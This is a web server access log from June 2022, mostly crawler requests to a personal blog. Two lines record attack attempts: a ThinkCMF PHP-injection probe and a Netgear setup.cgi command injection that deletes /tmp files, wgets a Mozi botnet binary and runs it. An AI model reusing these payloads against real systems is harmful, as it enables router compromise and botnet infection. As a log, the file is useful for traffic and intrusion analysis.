20.55.53.144 - - [22/Jun/2022:00:00:53 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36"
42.236.10.112 - - [22/Jun/2022:00:02:24 +0000] "GET / HTTP/1.1" 200 294 "https://mrchoke.org/" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36; 360Spider"
114.119.147.87 - - [22/Jun/2022:00:03:53 +0000] "GET /ch7_3357 HTTP/1.1" 301 178 "https://mrchoke.org/node/1101?share=linkedin" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [22/Jun/2022:00:03:56 +0000] "GET /ch7_3357/ HTTP/1.1" 200 7885 "https://mrchoke.org/node/1101?share=linkedin" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
216.244.66.229 - - [22/Jun/2022:00:04:03 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [22/Jun/2022:00:04:03 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [22/Jun/2022:00:07:19 +0000] "GET /node/41/feed HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [22/Jun/2022:00:07:28 +0000] "GET /node/220/feed HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [22/Jun/2022:00:07:32 +0000] "GET /node/253/feed HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [22/Jun/2022:00:09:04 +0000] "GET /node/201/feed HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [22/Jun/2022:00:09:07 +0000] "GET /node/64/feed HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [22/Jun/2022:00:09:36 +0000] "GET /feed/?attachment_id=1025 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
87.250.224.3 - - [22/Jun/2022:00:10:02 +0000] "GET /node/category/trip/page/2 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
87.250.224.3 - - [22/Jun/2022:00:10:06 +0000] "GET /node/category/trip/page/2/ HTTP/1.1" 200 15759 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
87.250.224.3 - - [22/Jun/2022:00:10:39 +0000] "GET /node/category/trip/page/2/ HTTP/1.1" 200 15759 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
185.191.171.23 - - [22/Jun/2022:00:12:38 +0000] "GET /node/450 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.44 - - [22/Jun/2022:00:12:40 +0000] "GET /node/450/ HTTP/1.1" 200 9008 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.42 - - [22/Jun/2022:00:14:44 +0000] "GET /node/365 HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.3 - - [22/Jun/2022:00:14:45 +0000] "GET /node/365 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.44 - - [22/Jun/2022:00:14:47 +0000] "GET /node/365/ HTTP/1.1" 200 8857 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
216.244.66.229 - - [22/Jun/2022:00:16:18 +0000] "GET /ch7_3537/ HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [22/Jun/2022:00:16:20 +0000] "GET /img_6727-2/ HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
114.119.147.87 - - [22/Jun/2022:00:17:43 +0000] "GET /node/483?share=reddit HTTP/1.1" 302 154 "https://mrchoke.org/node/483?replytocom=586&ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [22/Jun/2022:00:17:49 +0000] "GET /node/483?share=reddit HTTP/1.1" 301 178 "https://mrchoke.org/node/483?replytocom=586&ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.87 - - [22/Jun/2022:00:17:54 +0000] "GET /node/483/?share=reddit HTTP/1.1" 200 8786 "https://mrchoke.org/node/483?replytocom=586&ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
185.191.171.34 - - [22/Jun/2022:00:19:37 +0000] "GET /node/426 HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.37 - - [22/Jun/2022:00:19:38 +0000] "GET /node/426 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.24 - - [22/Jun/2022:00:19:40 +0000] "GET /node/426/ HTTP/1.1" 200 8518 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
114.119.147.74 - - [22/Jun/2022:00:20:02 +0000] "GET /node/52?share=linkedin HTTP/1.1" 302 154 "https://mrchoke.org/node/52?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.74 - - [22/Jun/2022:00:20:09 +0000] "GET /node/52?share=linkedin HTTP/1.1" 301 178 "https://mrchoke.org/node/52?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
216.244.66.229 - - [22/Jun/2022:00:21:19 +0000] "GET /img_6662 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [22/Jun/2022:00:21:21 +0000] "GET /img_6699 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
114.119.147.86 - - [22/Jun/2022:00:21:35 +0000] "GET /node/tag/ios6 HTTP/1.1" 301 178 "https://static.mrchoke.org/node/638" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [22/Jun/2022:00:21:41 +0000] "GET /node/tag/ios6/ HTTP/1.1" 200 10728 "https://static.mrchoke.org/node/638" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
44.204.65.23 - - [22/Jun/2022:00:22:15 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15"
114.119.147.87 - - [22/Jun/2022:00:23:00 +0000] "GET /node/date/2004/07/21 HTTP/1.1" 302 154 "https://mrchoke.org/node/394?share=reddit" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
216.244.66.229 - - [22/Jun/2022:00:24:03 +0000] "GET /node/360/?share=google-plus-1 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [22/Jun/2022:00:24:05 +0000] "GET /node/67/?share=google-plus-1 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
114.119.147.73 - - [22/Jun/2022:00:24:41 +0000] "GET /node/category/music/page/5?ak_action=accept_mobile HTTP/1.1" 302 154 "https://mrchoke.org/node/category/music/page/4?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.73 - - [22/Jun/2022:00:24:55 +0000] "GET /node/category/music/page/5?ak_action=accept_mobile HTTP/1.1" 301 178 "https://mrchoke.org/node/category/music/page/4?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
216.244.66.229 - - [22/Jun/2022:00:25:03 +0000] "GET /node/85/feed HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
114.119.147.81 - - [22/Jun/2022:00:25:41 +0000] "GET /node/category/music/page/5?ak_action=accept_mobile HTTP/1.1" 302 154 "https://mrchoke.org/node/category/music/page/4?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
185.191.171.45 - - [22/Jun/2022:00:30:42 +0000] "GET /robots.txt HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.7 - - [22/Jun/2022:00:30:43 +0000] "GET /node/456 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.15 - - [22/Jun/2022:00:30:47 +0000] "GET /node/456/ HTTP/1.1" 200 8249 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.7.214.104 - - [22/Jun/2022:00:36:02 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 396 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.191.171.4 - - [22/Jun/2022:00:36:23 +0000] "GET /node/category/%E0%B8%81%E0%B8%A7%E0%B8%B5 HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
5.255.253.163 - - [22/Jun/2022:00:37:42 +0000] "GET /node/tag/dole HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
87.250.224.3 - - [22/Jun/2022:00:37:43 +0000] "GET /node/tag/dole HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
87.250.224.3 - - [22/Jun/2022:00:37:47 +0000] "GET /node/tag/dole/ HTTP/1.1" 200 10265 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
114.119.147.97 - - [22/Jun/2022:00:38:06 +0000] "GET /node/939/img_6376?share=twitter HTTP/1.1" 302 154 "https://mrchoke.org/node/939/img_6376?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.97 - - [22/Jun/2022:00:38:14 +0000] "GET /node/939/img_6376?share=twitter HTTP/1.1" 301 178 "https://mrchoke.org/node/939/img_6376?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.97 - - [22/Jun/2022:00:38:18 +0000] "GET /node/939/img_6376/?share=twitter HTTP/1.1" 200 7901 "https://mrchoke.org/node/939/img_6376?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
202.14.122.98 - - [22/Jun/2022:00:39:14 +0000] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 162 "-" "-"
114.119.147.74 - - [22/Jun/2022:00:39:37 +0000] "GET /node/49 HTTP/1.1" 301 178 "https://mrchoke.org/node/50" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.74 - - [22/Jun/2022:00:39:43 +0000] "GET /node/49/ HTTP/1.1" 200 10212 "https://mrchoke.org/node/50" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.97 - - [22/Jun/2022:00:41:02 +0000] "GET /node/9 HTTP/1.1" 301 178 "https://static.mrchoke.org/node/10" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.97 - - [22/Jun/2022:00:41:23 +0000] "GET /node/9/ HTTP/1.1" 200 8680 "https://static.mrchoke.org/node/10" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.75 - - [22/Jun/2022:00:43:45 +0000] "GET /node/52?share=twitter HTTP/1.1" 302 154 "https://mrchoke.org/node/52?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.75 - - [22/Jun/2022:00:43:53 +0000] "GET /node/52?share=twitter HTTP/1.1" 301 178 "https://mrchoke.org/node/52?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
185.191.171.41 - - [22/Jun/2022:00:44:38 +0000] "GET /robots.txt HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.36 - - [22/Jun/2022:00:44:39 +0000] "GET /node/category/smf HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.18 - - [22/Jun/2022:00:44:40 +0000] "GET /node/category/smf HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.26 - - [22/Jun/2022:00:44:43 +0000] "GET /node/category/smf/ HTTP/1.1" 200 8453 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.38 - - [22/Jun/2022:00:45:00 +0000] "GET /node/category/toshiba/satellite HTTP/1.1" 302 154 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.2 - - [22/Jun/2022:00:45:05 +0000] "GET /node/category/toshiba/satellite HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.24 - - [22/Jun/2022:00:45:08 +0000] "GET /node/category/toshiba/satellite/ HTTP/1.1" 200 10091 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
114.119.147.86 - - [22/Jun/2022:00:45:08 +0000] "GET /node/1496?ak_action=accept_mobile HTTP/1.1" 302 154 "https://mrchoke.org/node/1496?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [22/Jun/2022:00:45:13 +0000] "GET /node/1496?ak_action=accept_mobile HTTP/1.1" 301 178 "https://mrchoke.org/node/1496?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.86 - - [22/Jun/2022:00:45:19 +0000] "GET /node/1496/?ak_action=accept_mobile HTTP/1.1" 200 9850 "https://mrchoke.org/node/1496?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
185.191.171.23 - - [22/Jun/2022:00:46:27 +0000] "GET /node/1298/img_7028 HTTP/1.1" 301 178 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
185.191.171.25 - - [22/Jun/2022:00:46:30 +0000] "GET /node/1298/img_7028/ HTTP/1.1" 200 7951 "-" "Mozilla/5.0 (compatible; SemrushBot/7~bl; +http://www.semrush.com/bot.html)"
114.119.147.75 - - [22/Jun/2022:00:46:40 +0000] "GET /node/1862/screenshot-2014-03-16-22-25-20?share=linkedin HTTP/1.1" 302 154 "https://mrchoke.org/node/1862/screenshot-2014-03-16-22-25-20?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.75 - - [22/Jun/2022:00:46:41 +0000] "GET /node/1862/screenshot-2014-03-16-22-25-20?share=linkedin HTTP/1.1" 301 178 "https://mrchoke.org/node/1862/screenshot-2014-03-16-22-25-20?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.75 - - [22/Jun/2022:00:46:43 +0000] "GET /node/1862/screenshot-2014-03-16-22-25-20/?share=linkedin HTTP/1.1" 200 7906 "https://mrchoke.org/node/1862/screenshot-2014-03-16-22-25-20?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
207.46.13.174 - - [22/Jun/2022:00:51:39 +0000] "GET /wp-includes/js/wp-emoji-release.min.js?ver=5.7.1 HTTP/2.0" 200 14229 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.114 - - [22/Jun/2022:00:51:42 +0000] "GET /wp-includes/css/dist/block-library/style.min.css?ver=5.7.1 HTTP/2.0" 200 58171 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
51.222.253.3 - - [22/Jun/2022:00:54:51 +0000] "GET / HTTP/1.1" 200 396 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
114.119.147.75 - - [22/Jun/2022:00:55:03 +0000] "GET /ch7_3595 HTTP/1.1" 301 178 "https://mrchoke.org/page/8?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.75 - - [22/Jun/2022:00:55:04 +0000] "GET /ch7_3595/ HTTP/1.1" 200 7880 "https://mrchoke.org/page/8?ak_action=reject_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.73 - - [22/Jun/2022:00:57:12 +0000] "GET /node/581/img_1732 HTTP/1.1" 301 178 "https://mrchoke.org/node/581/img_1731?share=reddit" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.73 - - [22/Jun/2022:00:57:24 +0000] "GET /node/581/img_1732/ HTTP/1.1" 200 7857 "https://mrchoke.org/node/581/img_1731?share=reddit" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
87.250.224.3 - - [22/Jun/2022:00:58:09 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
87.250.224.3 - - [22/Jun/2022:00:58:12 +0000] "GET /node/category/ifuse/ HTTP/1.1" 200 11523 "-" "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"
51.222.253.3 - - [22/Jun/2022:00:58:45 +0000] "GET /robots.txt HTTP/2.0" 404 123 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
51.222.253.20 - - [22/Jun/2022:00:58:48 +0000] "GET / HTTP/2.0" 200 282 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
207.46.13.149 - - [22/Jun/2022:00:59:01 +0000] "GET /node/tag/%E0%B9%80%E0%B8%8B%E0%B8%B5%E0%B8%A2%E0%B8%A3%E0%B9%8C-%E0%B8%A3%E0%B8%B1%E0%B8%87%E0%B8%AA%E0%B8%B4%E0%B8%95 HTTP/2.0" 404 186 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/100.0.4896.127 Safari/537.36"
114.119.147.73 - - [22/Jun/2022:00:59:04 +0000] "GET /node/339?share=facebook HTTP/1.1" 302 154 "https://mrchoke.org/node/339?replytocom=409" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
72.14.199.207 - - [22/Jun/2022:01:00:24 +0000] "GET /feed HTTP/1.1" 404 134 "-" "FeedFetcher-Google; (+http://www.google.com/feedfetcher.html)"
216.244.66.229 - - [22/Jun/2022:01:01:01 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [22/Jun/2022:01:01:01 +0000] "GET /robots.txt HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
51.222.253.1 - - [22/Jun/2022:01:02:49 +0000] "GET /node/485/ HTTP/2.0" 200 8132 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
114.119.147.97 - - [22/Jun/2022:01:04:54 +0000] "GET /node/153?share=reddit HTTP/1.1" 302 154 "https://mrchoke.org/node/153?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
114.119.147.97 - - [22/Jun/2022:01:05:07 +0000] "GET /node/153?share=reddit HTTP/1.1" 301 178 "https://mrchoke.org/node/153?ak_action=accept_mobile" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
216.244.66.229 - - [22/Jun/2022:01:05:11 +0000] "GET /node/51/feed HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [22/Jun/2022:01:05:23 +0000] "GET /node/1706/feed HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [22/Jun/2022:01:05:27 +0000] "GET /node/198/feed HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [22/Jun/2022:01:05:31 +0000] "GET /node/314/feed HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [22/Jun/2022:01:05:35 +0000] "GET /node/331/feed HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [22/Jun/2022:01:05:37 +0000] "GET /node/358/feed HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [22/Jun/2022:01:05:40 +0000] "GET /node/453/feed HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
216.244.66.229 - - [22/Jun/2022:01:07:23 +0000] "GET /node/152/feed HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)"
51.222.253.13 - - [22/Jun/2022:01:07:25 +0000] "GET /node/308/ HTTP/2.0" 200 8339 "-" "Mozilla/5.0 (compatible; AhrefsBot/7.0; +http://ahrefs.com/robot/)"
17.121.113.167 - - [22/Jun/2022:01:08:49 +0000] "GET /robots.txt HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)"
17.121.113.114 - - [22/Jun/2022:01:08:49 +0000] "GET /robots.txt HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)"
17.121.113.167 - - [22/Jun/2022:01:08:50 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)"
17.121.113.114 - - [22/Jun/2022:01:08:50 +0000] "GET / HTTP/1.1" 200 294 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Safari/605.1.15 (Applebot/0.1; +http://www.apple.com/go/applebot)"
114.119.147.86 - - [22/Jun/2022:01:10:22 +0000] "GET /node/1558/screenshot-2014-02-06-23-34-02 HTTP/1.1" 301 178 "https://mrchoke.org/node/1558/screenshot-2014-02-06-23-34-14?share=twitter" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
